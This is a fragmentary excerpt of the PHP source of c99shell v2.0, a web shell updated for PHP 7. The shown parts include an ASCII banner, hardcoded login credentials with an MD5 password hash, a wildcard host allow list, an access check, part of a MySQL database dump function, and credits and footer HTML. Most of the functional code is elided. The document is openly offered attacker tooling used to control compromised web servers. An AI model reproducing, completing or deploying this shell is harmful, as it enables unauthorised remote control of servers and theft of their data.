...
|_.__/ \__, | \_| \_/\__,_|_/___\___|_| |_\_____/\___/ \__,_|_|\___|
        __/ |                                                       
       |___/                                                        
*			c99shell.php v.2.0 (PHP 7) (25.02.2019) Updated by: trhacknon for PHP 7
...
$login = "trhacknon";
$pass = "";
$md5_pass = "09054dda72e9ec27fe67588ad9041662";
$host_allow = array(
    "*"
);
...
{
    exit("<a href=\"https://github.com/trhacknon/C99Shell-PHP7\">c99shell</a>: Access Denied - your host (" . getenv("REMOTE_ADDR") . ") not allow");
}
if (!empty($login))
{
    if (empty($md5_pass))
    ...
    if (!function_exists("mysql_dump"))
    {
        function mysql_dump($set)
        {
            ...
            $out = "# Dumped by C99Shell.SQL v. " . $shver . "
					# Home page: https://github.com/trhacknon/C99Shell-PHP7
					#
					# Host settings:
...
if ($act == "about")
{
    echo "<center><b>Credits:<br><br>Kudos to the &quot;Original Creators&quot; of C99Shell.<br><br>and <u>trhacknon</u> for Latest safe-build and update for PHP 7.<br><br>Thanks to all who reported the bugs.<br>If there are more bugs, please create an issue in https://github.com/trhacknon/C99Shell-PHP7 </b>";
} ?>
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell v. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>maintained by</b></u></a> trhacknon | <a href="https://github.com/trhacknon/C99Shell-PHP7"><font color="#FF0000">C99Shell Github</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime() - starttime, 4); ?> ]--</b></p></td></tr></table>
